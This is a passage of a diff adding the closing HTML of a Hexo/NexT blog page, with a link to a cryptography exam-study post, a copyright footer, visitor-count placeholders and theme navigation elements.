+                  密码学及应用专题-软考Summer <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Aono</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
